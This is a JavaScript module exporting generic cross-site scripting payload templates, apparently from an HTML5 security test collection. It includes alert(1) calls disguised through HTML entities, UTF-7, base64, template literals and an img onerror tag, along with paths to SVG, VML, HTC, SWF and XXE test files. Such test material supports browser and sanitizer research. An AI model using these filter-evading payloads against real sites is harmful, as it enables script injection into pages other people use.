/* Payload - the generic payload templates */
(function (root, factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], factory);
    } else if (typeof exports === 'object') {
        // Node. Does not work with strict CommonJS, but
        // only CommonJS-like environments that support module.exports,
        // like Node.
        module.exports = factory();
    } else {
        // Browser globals (root is window)
        root.payloads = factory();
  }
}(this, function () {
return {
    'js_uri_alert'      : 'javascript:alert(1)',
    'js_uri_alert_2'    : 'javascript:alert(2)',
    'js_uri_alert_3'    : 'javascript:alert(3)',
    'js_alert'          : 'alert(1)',
    'js_alert_2'        : 'alert(2)',
    'js_alert_3'        : 'alert(3)',
    'js_alert_only'     : 'alert',
    'js_alert_entities' : '&#x61;l&#x65;rt&#40;1)',
    'js_alert_html5ent' : 'alert&lpar;1&rpar;',
    'js_alert_template' : 'alert`1`',
    'js_esc_template'   : 'alert\\`1\\`',
    'js_write'          : 'write(1)',
    'js_write_2'        : 'write(2)',
    'js_write_only'     : 'write',
    'js_focus'          : 'focus()',
    'js_focus_only'     : 'focus',
    'js_blur'           : 'blur()',
    'js_blur_only'      : 'blur',
    'js_utf7_alert_1'   : '&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi',
    'js_utf7_alert_2'   : '&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>',
    'js_base64_alert'   : 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'html_alert_encoded': '&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;',
    'svg_path'          : 'test.svg',
    'svg_path_2'        : 'test2.svg',
    'svg_path_3'        : 'test5.svg',
    'svg_font_path'     : 'font.svg',
    'css_path'          : 'test.css',
    'vml_path'          : 'test.vml',
    'sct_path'          : 'test.sct',
    'htc_path'          : 'test.htc',
    'xbl_path'          : 'test.xbl',
    'xdr_path'          : 'test.xdr',
    'xxe_path'          : 'http://html5sec.org/test.xxe',
    'swf_path'          : 'test.swf',
    'jar_path'          : 'test.jar',
    'event_path'        : 'event.php'
}
}));
